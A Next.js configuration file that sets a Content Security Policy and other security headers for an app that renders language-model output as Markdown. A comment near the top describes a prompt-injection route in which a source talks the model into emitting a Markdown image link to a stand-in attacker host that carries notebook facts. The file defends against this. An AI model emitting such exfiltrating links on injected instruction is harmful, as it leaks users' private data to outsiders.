import type { NextConfig } from "next";

// The engine is a separate Python service (see backend/). The browser calls /api/* on this
// origin and src/proxy.ts forwards it after checking the request. There is intentionally no
// rewrites() entry for /api here: a rewrite would forward requests the proxy never saw.

// Model output is rendered as Markdown, and a source can talk the model into emitting
// `![](https://attacker.example/?d=<notebook facts>)`. The Markdown component drops images;
// this policy is the second lock: the page may only load images and media from this origin
// (plus data:/blob:, which never leave the browser), so no image or media markup can make
// it call out. There is no default-src/script-src/connect-src on purpose: Next.js inlines
// its bootstrap scripts, `next dev` needs eval and a websocket, and a script policy that
// has not been tested against all of that would break the app rather than protect it.
const contentSecurityPolicy = [
  "img-src 'self' data: blob:",
  "media-src 'self' blob:",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
].join("; ");

const securityHeaders = [
  { key: "Content-Security-Policy", value: contentSecurityPolicy },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "no-referrer" },
  { key: "X-Frame-Options", value: "DENY" },
];

const nextConfig: NextConfig = {
  // The API client is a workspace package shipped as TypeScript source.
  transpilePackages: ["@overtone/client"],
  poweredByHeader: false,
  async headers() {
    return [{ source: "/:path*", headers: securityHeaders }];
  },
  turbopack: {
    rules: {
      "*.css": {
        loaders: ["@tailwindcss/turbopack"],
        as: "*.css",
      },
    },
  },
};

export default nextConfig;
